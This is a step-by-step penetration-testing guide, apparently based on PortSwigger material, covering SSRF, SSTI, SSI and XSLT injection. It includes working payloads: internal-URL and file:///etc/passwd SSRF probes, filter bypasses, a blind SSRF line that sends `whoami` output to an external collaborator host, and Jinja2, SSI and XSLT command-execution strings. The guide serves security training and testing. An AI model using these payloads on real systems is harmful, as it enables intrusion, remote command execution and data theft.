# Server-Side Attacks

[Relative Cheat Sheet](./server-side-cheat.md)

## Step-by-Step Guide for Testing and Exploiting Server-Side Vulnerabilities

### 1. Understand Server-Side Vulnerabilities
   - **Explanation**: Server-side vulnerabilities include Server-Side Request Forgery (SSRF), Server-Side Template Injection (SSTI), Server-Side Includes (SSI), and XSLT Injection, which allow attackers to forge internal requests, execute code via templates, or access files. SSRF targets internal resources, SSTI exploits template engines, and SSI/XSLT manipulate server directives or XML processing.
   - **Why It's Done**: Knowing these vulnerabilities helps identify specific input points and payloads for testing, as each has unique exploitation methods.
   - **Example**: SSRF might allow access to `http://localhost/admin`, while SSTI could execute `{{7*7}}` in a template.

### 2. Identify Entry Points
   - **Explanation**: Find inputs that trigger server-side processing, such as URL parameters for fetching resources (SSRF), template inputs (SSTI), or XML/submit fields (SSI/XSLT). Use Burp to map these.
   - **Why It's Done**: These are injection points for server-side attacks; missing them limits testing scope.
   - **Example**: A stock check API with `stockApi=http://external.com` for SSRF.

### 3. Test for SSRF
   - **Explanation**: Inject internal URLs (e.g., `http://127.0.0.1:8080/admin`) or file schemes (`file:///etc/passwd`) to see if the server makes unauthorized requests.
   - **Why It's Done**: SSRF can access internal services, metadata, or files, revealing sensitive data.
   - **Example**: Change `stockApi=http://external.com` to `stockApi=http://localhost/admin` and check response.

### 4. Exploit Blind SSRF
   - **Explanation**: If no response is visible, use out-of-band (OAST) techniques like DNS (`http://attacker.com`) or HTTP requests to confirm SSRF.
   - **Why It's Done**: Blind SSRF is harder to detect but can still exfiltrate data via external interactions.
   - **Example**: `stockApi=http://`whoami`.burpcollaborator.net` to send server data via DNS.

### 5. Bypass SSRF Defenses
   - **Explanation**: Use alternative formats like `127.1`, `@internal.com`, or open redirects to bypass blacklists or whitelists.
   - **Why It's Done**: Many SSRF protections filter only common patterns, allowing creative bypasses.
   - **Example**: `stockApi=http://127.0.0.1#@internal.com` to trick filters.

### 6. Test for SSTI
   - **Explanation**: Inject template syntax like `${{<%[%'"}}%\.` or `{{7*7}}` into inputs rendered by template engines (e.g., Jinja2, Twig).
   - **Why It's Done**: Confirms if user input is evaluated as template code, potentially leading to RCE.
   - **Example**: Input `{{7*7}}` in a username field; if output is `49`, it’s vulnerable.

### 7. Identify Template Engine
   - **Explanation**: Use engine-specific payloads (e.g., `{{7*'7'}}` for Twig vs `{%7*7%}` for Jinja2) and error messages to identify the engine.
   - **Why It's Done**: Each engine has unique syntax for exploitation, ensuring accurate payloads.
   - **Example**: Error mentioning `Jinja2` or Twig-specific output like `7777777`.

### 8. Exploit SSTI for RCE
   - **Explanation**: Use engine-specific payloads to execute commands, like `{{self._filename.__class__.__init__.__globals__['os'].popen('id').read()}}` for Jinja2.
   - **Why It's Done**: Escalates from code evaluation to full command execution.
   - **Example**: Input `{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}` to get server user.

### 9. Test for SSI and XSLT Injection
   - **Explanation**: For SSI, inject directives like `<!--#exec cmd="id" -->` in inputs like user-agent or forms. For XSLT, submit XML with `<xsl:value-of select="system('id')"/>` or file reads.
   - **Why It's Done**: These allow command execution or file access if the server processes SSI or XSLT.
   - **Example**: SSI in user-agent: `<!--#exec cmd="ls" -->`, accessed via log inclusion.

### 10. Assess Prevention Measures
   - **Explanation**: Check for input validation, sandboxing, or disabled external entities (XXE) and URL includes.
   - **Why It's Done**: Provides remediation recommendations, like disabling SSI or using safe template engines.
   - **Example**: Secure app blocks external URLs in SSRF or uses static templates.

This guide, based on PortSwigger Web Security Academy and the provided cheat sheet, provides a detailed process for testing server-side vulnerabilities. Test ethically within scope.